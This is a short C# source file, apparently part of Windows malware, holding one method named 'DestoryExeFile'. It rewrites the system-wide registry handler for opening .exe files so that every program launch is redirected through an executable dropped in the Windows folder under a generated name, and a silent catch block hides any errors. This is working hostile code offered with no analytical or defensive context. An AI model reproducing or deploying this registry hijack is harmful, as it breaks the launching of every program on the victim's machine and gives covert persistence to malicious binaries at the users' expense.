using System;
using Microsoft.Win32;

namespace Fast;

internal class EAF
{
	public static void DestoryExeFile()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			string text = "exefile";
			RegistryKey registryKey = Registry.ClassesRoot.CreateSubKey(text);
			registryKey = Registry.ClassesRoot.CreateSubKey(text + "\\Shell\\Open\\command");
			registryKey.SetValue("", "\"" + folderPath + "\\" + Program.UniqueID() + ".exe\" \"%L\"");
			registryKey.Close();
		}
		catch
		{
		}
	}
}
